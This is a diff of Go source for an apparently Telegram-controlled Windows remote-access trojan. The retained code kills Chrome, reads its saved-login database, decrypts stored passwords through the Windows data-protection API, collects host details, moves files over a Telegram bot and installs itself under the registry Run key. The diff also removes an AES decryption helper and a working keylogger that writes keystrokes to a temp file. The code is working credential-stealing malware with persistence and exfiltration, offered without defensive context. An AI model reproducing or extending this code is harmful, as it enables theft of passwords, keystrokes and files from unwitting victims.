@@ -1,32 +1,27 @@
 package main
 
 import (
-	"crypto/aes"
-	"crypto/cipher"
-	"database/sql"
-	"encoding/json"
-	"fmt"
-	"image/png"
-	"io"
-	"io/ioutil"
+	"os"
+	"os/exec"
+	"strings"
+	"gopkg.in/telegram-bot-api.v4"
 	"log"
 	"net"
 	"net/http"
-	"os"
-	"os/exec"
-	"os/user"
-	"runtime"
+	"io/ioutil"
+	"encoding/json"
 	"strconv"
-	"strings"
 	"syscall"
-	"unicode/utf8"
-	"unsafe"
-
-	"github.com/TheTitanrain/w32"
-	_ "github.com/mattn/go-sqlite3"
-	"github.com/vova616/screenshot"
 	"golang.org/x/sys/windows/registry"
-	tgbotapi "gopkg.in/telegram-bot-api.v4"
+	"io"
+	"github.com/vova616/screenshot"
+	"image/png"
+	"runtime"
+	"unicode/utf8"
+	"os/user"
+	"database/sql"
+	"github.com/mattn/go-sqlite3"
+	"unsafe"
 )
 
 //import "gopkg.in/telegram-bot-api.v4"
@@ -36,9 +31,8 @@ func sendMsg(chat_id int64, text string){
 	//msg.ReplyToMessageID = chat_id
 	bot.Send(msg)
 }*/
-var keyloggerRunning = true
 
-func listDir(path string) []string {
+func listDir(path string) ([]string) {
 	dir, _ := os.Open(path)
 	defer dir.Close()
 	fi, _ := dir.Stat()
@@ -59,7 +53,7 @@ func listDir(path string) []string {
 	return filenames
 }
 
-func arrToStr(sep string, arr []string) string {
+func arrToStr(sep string, arr []string) (string) {
 	out := ""
 	for _, el := range arr {
 		out += el + sep
@@ -67,7 +61,7 @@ func arrToStr(sep string, arr []string) string {
 	return out
 }
 
-func clearMSG(s string) string {
+func clearMSG(s string) (string) {
 	if !utf8.ValidString(s) {
 		v := make([]rune, 0, len(s))
 		for i, r := range s {
@@ -97,7 +91,7 @@ func remove(slice []int, s int) []int {
 	return append(slice[:s], slice[s+1:]...)
 }
 
-func getInfo() string {
+func getInfo() (string) {
 	msg := ""
 	hName, _ := os.Hostname()
 	currUser, _ := user.Current()
@@ -124,36 +118,6 @@ func NewBlob(d []byte) *DATA_BLOB {
 	}
 }
 
-func DecryptDAPI(data []byte) ([]byte, error) {
-	dllCrypt := syscall.NewLazyDLL("Crypt32.dll")
-	dllKernel := syscall.NewLazyDLL("Kernel32.dll")
-	procDecryptData := dllCrypt.NewProc("CryptUnprotectData")
-	procLocalFree := dllKernel.NewProc("LocalFree")
-	var outBlob DATA_BLOB
-	r, _, err := procDecryptData.Call(uintptr(unsafe.Pointer(NewBlob(data))), 0, 0, 0, 0, 0, uintptr(unsafe.Pointer(&outBlob)))
-	if r == 0 {
-		return nil, err
-	}
-	defer procLocalFree.Call(uintptr(unsafe.Pointer(outBlob.pbData)))
-	return outBlob.ToByteArray(), nil
-}
-
-func DecryptAES(crypted, key, nounce []byte) ([]byte, error) {
-	block, err := aes.NewCipher(key)
-	if err != nil {
-		return nil, err
-	}
-	blockMode, err := cipher.NewGCM(block)
-	if err != nil {
-		return nil, err
-	}
-	origData, err := blockMode.Open(nil, nounce, crypted, nil)
-	if err != nil {
-		return nil, err
-	}
-	return origData, nil
-}
-
 func Decrypt(data []byte) ([]byte, error) {
 	var outblob DATA_BLOB
 	r, _, err := procDecryptData.Call(uintptr(unsafe.Pointer(NewBlob(data))), 0, 0, 0, 0, 0, uintptr(unsafe.Pointer(&outblob)))
@@ -164,20 +128,18 @@ func Decrypt(data []byte) ([]byte, error) {
 	return outblob.ToByteArray(), nil
 }
 
-func getChrome() string {
+func getChrome() (string) {
 	currUser, _ := user.Current()
-	var url, username, password string
-	var out strings.Builder
-
+	var url string
+	var username string
+	var password string
 	killChromeCommand := "taskkill /F /IM chrome.exe /T"
 	cmd := exec.Command("cmd", "/Q", "/C", killChromeCommand)
 	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
 	cmdout, _ := cmd.Output()
-	out.WriteString(string(cmdout))
-
+	out := string(cmdout)
 	path := "C:\\Users\\" + strings.Split(currUser.Username, "\\")[1] + "\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data"
 	db, err := sql.Open("sqlite3", path)
-
 	if err != nil {
 		return err.Error()
 	}
@@ -185,19 +147,18 @@ func getChrome() string {
 	if err != nil {
 		return err.Error()
 	}
-
 	for rows.Next() {
 		rows.Scan(&url, &username, &password)
 		pwd, err := Decrypt([]byte(password))
 		if err != nil {
-			out.WriteString("err:" + err.Error())
+			out += "err:" + err.Error()
 		}
-		out.WriteString(fmt.Sprintf("uri: %s; username: %s; password: %s\n", url, username, string(pwd)))
+		out += "uri:\"" + url + "\"; username: " + username + "; password: " + string(pwd) + "\n"
 	}
-	return out.String()
+	return out
 }
 
-func splitMessage(msg string) []string {
+func splitMessage(msg string) ([]string) {
 	msgBytes := []byte(msg)
 	out := []string{}
 	for i := 0; i <= len(msgBytes); i += 3048 {
@@ -256,7 +217,7 @@ func uploadFile(chat int64, file string, api *tgbotapi.BotAPI, remove bool) {
 	}
 }
 
-func parseIpInfo(ipCfg *IpConfig) string {
+func parseIpInfo(ipCfg *IpConfig) (string) {
 	out := ""
 	out += "Ip: " + ipCfg.Ip + "\n"
 	out += "Country: " + ipCfg.Country + "\n"
@@ -265,7 +226,7 @@ func parseIpInfo(ipCfg *IpConfig) string {
 	return out
 }
 
-func dlFile(id string, name string, api *tgbotapi.BotAPI) string {
+func dlFile(id string, name string, api *tgbotapi.BotAPI) (string) {
 	url, err := api.GetFileDirectURL(id)
 	out := new(os.File)
 	if runtime.GOOS == "windows" {
@@ -296,7 +257,7 @@ func CheckRegistryProgram() (value string, result bool) {
 	}
 }
 
-func CheckError(err error) bool {
+func CheckError(err error) (bool) {
 	return err != nil
 }
 
@@ -384,96 +345,4 @@ func RegisterAutoRun() error {
 
 func UnRegisterAutoRun() {
 	DeleteRegistryKey(registry.CURRENT_USER, `Software\Microsoft\Windows\CurrentVersion\Run`, nameFile)
-}
-
-var (
-	moduser32 = syscall.NewLazyDLL("user32.dll")
-
-	procGetKeyboardLayout     = moduser32.NewProc("GetKeyboardLayout")
-	procGetKeyboardState      = moduser32.NewProc("GetKeyboardState")
-	procToUnicodeEx           = moduser32.NewProc("ToUnicodeEx")
-	procGetKeyboardLayoutList = moduser32.NewProc("GetKeyboardLayoutList")
-	procMapVirtualKeyEx       = moduser32.NewProc("MapVirtualKeyExW")
-	procGetKeyState           = moduser32.NewProc("GetKeyState")
-)
-
-func NewKeylogger() Keylogger {
-	kl := Keylogger{}
-
-	return kl
-}
-
-// Keylogger represents the keylogger
-type Keylogger struct {
-	lastKey int
-}
-
-// Key is a single key entered by the user
-type Key struct {
-	Empty   bool
-	Rune    rune
-	Keycode int
-}
-
-func (kl *Keylogger) GetKey() Key {
-	activeKey := 0
-	var keyState uint16
-	for i := 0; i < 256; i++ {
-		keyState = w32.GetAsyncKeyState(i)
-		if keyState&(1<<15) != 0 && !(i < 0x2F && i != 0x20) && (i < 160 || i > 165) && (i < 91 || i > 93) {
-			activeKey = i
-			break
-		}
-	}
-	if activeKey != 0 {
-		if activeKey != kl.lastKey {
-			kl.lastKey = activeKey
-			key := Key{Empty: false, Keycode: activeKey}
-			outBuf := make([]uint16, 1)
-			kbState := make([]uint8, 256)
-			kbLayout, _, _ := procGetKeyboardLayout.Call(uintptr(0))
-
-			if w32.GetAsyncKeyState(w32.VK_SHIFT)&(1<<15) != 0 {
-				kbState[w32.VK_SHIFT] = 0xFF
-			}
-
-			capitalState, _, _ := procGetKeyState.Call(uintptr(w32.VK_CAPITAL))
-			if capitalState != 0 {
-				kbState[w32.VK_CAPITAL] = 0xFF
-			}
-
-			if w32.GetAsyncKeyState(w32.VK_CONTROL)&(1<<15) != 0 {
-				kbState[w32.VK_CONTROL] = 0xFF
-			}
-
-			if w32.GetAsyncKeyState(w32.VK_MENU)&(1<<15) != 0 {
-				kbState[w32.VK_MENU] = 0xFF
-			}
-
-			_, _, _ = procToUnicodeEx.Call(
-				uintptr(activeKey),
-				uintptr(0),
-				uintptr(unsafe.Pointer(&kbState[0])),
-				uintptr(unsafe.Pointer(&outBuf[0])),
-				uintptr(1),
-				uintptr(1),
-				uintptr(kbLayout))
-
-			key.Rune, _ = utf8.DecodeRuneInString(syscall.UTF16ToString(outBuf))
-
-			// Append the pressed key to the log file
-			file, err := os.OpenFile(os.TempDir()+"\\keylog.txt", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0600)
-			if err != nil {
-				log.Println(err)
-			}
-			defer file.Close()
-			if _, err := file.WriteString(string(key.Rune)); err != nil {
-				log.Println(err)
-			}
-			return key
-		}
-	} else {
-		kl.lastKey = 0
-	}
-	return Key{Empty: true}
 }
